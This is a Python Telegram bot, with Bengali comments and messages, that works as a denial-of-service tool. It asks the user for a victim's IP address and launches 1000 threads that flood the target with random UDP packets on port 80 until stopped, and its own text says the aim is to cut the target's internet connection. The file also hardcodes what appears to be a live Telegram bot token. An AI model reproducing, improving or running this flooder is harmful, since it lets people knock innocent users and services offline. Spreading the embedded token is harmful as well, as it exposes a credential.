import os
import socket
import threading
import random
import time
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from colorama import Fore, Style, init

# কালার ইনিশিয়ালাইজ
init()

# --- কনফিগারেশন ---
TOKEN = "8620529154:AAHcN6529pcI8F6i417poylsymr0yLFkEhQ"
attacking = False
target_ip = ""

# হাই স্পিড প্যাকেট ইঞ্জিন (UDP Flood)
def udp_flood(ip, port):
    global attacking
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # ১০২৪ বাইটের ভারী প্যাকেট (ব্যান্ডউইথ জ্যাম করার জন্য)
    bytes_payload = random._urandom(1024)
    
    while attacking:
        try:
            client.sendto(bytes_payload, (ip, port))
        except:
            pass
    client.close()

# ১. স্টার্ট কমান্ড (বাটন সরাসরি বটের উপরে আসবে)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # সরাসরি বড় বাটন (Reply Keyboard)
    keyboard = [
        [KeyboardButton("🚀 START ATTACK")],
        [KeyboardButton("🛑 STOP ATTACK")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    welcome_text = (
        "🔥 *MR DEVELOPER - ULTIMATE DDOS* 🔥\n\n"
        "এই বটটি দিয়ে আপনি যেকোনো আইপি-তে প্যাকেট স্প্যামিং করতে পারবেন।\n"
        "নিচের বাটন ব্যবহার করে সরাসরি কন্ট্রোল করুন।"
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ২. মেসেজ ও বাটন হ্যান্ডলার
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attacking, target_ip
    user_text = update.message.text

    # স্টার্ট অ্যাটাক বাটনে ক্লিক করলে
    if user_text == "🚀 START ATTACK":
        await update.message.reply_text("🎯 *অ্যাটাক করার জন্য ভিকটিমের IP Address পাঠান:*", parse_mode='Markdown')
        context.user_data['waiting_for_ip'] = True
        return

    # স্টপ অ্যাটাক বাটনে ক্লিক করলে
    if user_text == "🛑 STOP ATTACK":
        attacking = False
        await update.message.reply_text("✅ *অ্যাটাক বন্ধ করা হয়েছে। ইন্টারনেট এখন স্বাভাবিক হবে।*", parse_mode='Markdown')
        print(Fore.YELLOW + f"[!] Attack stopped on {target_ip}" + Style.RESET_ALL)
        return

    # আইপি পাওয়ার পর অ্যাটাক শুরু
    if context.user_data.get('waiting_for_ip'):
        target_ip = user_text.strip()
        context.user_data['waiting_for_ip'] = False
        
        attacking = True
        
        await update.message.reply_text(
            f"⚔️ *EXTREME ATTACK STARTED!*\n\n"
            f"📍 *Target IP:* `{target_ip}`\n"
            f"📊 *Power:* 1000 Threads (Extreme)\n"
            f"📡 *Result:* ওই ডিভাইসে এখন 'No Internet' আসবে।",
            parse_mode='Markdown'
        )
        
        print(Fore.RED + f"\n[!] Attacking IP: {target_ip} with 1000 threads..." + Style.RESET_ALL)

        # ১০০০টি থ্রেড একসাথে প্যাকেট পাঠাবে (ফুল স্পিড)
        for i in range(1000):
            t = threading.Thread(target=udp_flood, args=(target_ip, 80))
            t.daemon = True
            t.start()

# ৩. মেইন লজিক
def main():
    print(Fore.CYAN + "MR DEVELOPER BOT IS FIXING AND STARTING..." + Style.RESET_ALL)
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print(Fore.GREEN + "BOT IS LIVE! ERROR FIXED AND BUTTONS ADDED." + Style.RESET_ALL)
    app.run_polling()

if __name__ == "__main__":
    main()
    
